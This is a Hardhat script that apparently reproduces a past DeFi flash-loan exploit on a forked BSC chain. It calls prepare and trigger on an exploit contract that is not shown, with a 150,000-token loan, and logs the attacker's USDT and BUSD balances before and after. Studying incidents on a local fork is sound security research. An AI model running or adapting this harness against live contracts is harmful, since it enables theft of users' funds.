const hre = require("hardhat");
const {resetFork, getExpContract} = require("../utils");

const ethers = hre.ethers;

const NETWORK = "BSC";
const BLOCK_NUMBER = 16008280;

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const busdAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";

const work = async () => {
  await resetFork(NETWORK, BLOCK_NUMBER);

  const attackName = __dirname.split("/").pop();
  const expContract = await getExpContract(attackName);

  // Before attack
  const [attacker] = await ethers.getSigners();
  const usdtContract = await ethers.getContractAt("IERC20", usdtAddress);
  const busdContract = await ethers.getContractAt("IERC20", busdAddress);
  const oneEther = ethers.utils.parseUnits("1", 18);
  const usdtBefore = (await usdtContract.balanceOf(attacker.address)).div(oneEther);
  const busdBefore = (await busdContract.balanceOf(attacker.address)).div(oneEther);
  console.log(`Before attack USDT balance = ${usdtBefore}`);
  console.log(`Before attack BUSD balance = ${busdBefore}`);

  const flashLoanSize = ethers.utils.parseUnits("150000", 18);
  await expContract.prepare(flashLoanSize);
  await expContract.trigger();

  // After attack
  const usdtAfter = (await usdtContract.balanceOf(attacker.address)).div(oneEther);
  const busdAfter = (await busdContract.balanceOf(attacker.address)).div(oneEther);
  console.log(`After attack USDT balance = ${usdtAfter}`);
  console.log(`After attack BUSD balance = ${busdAfter}`);
};

work();
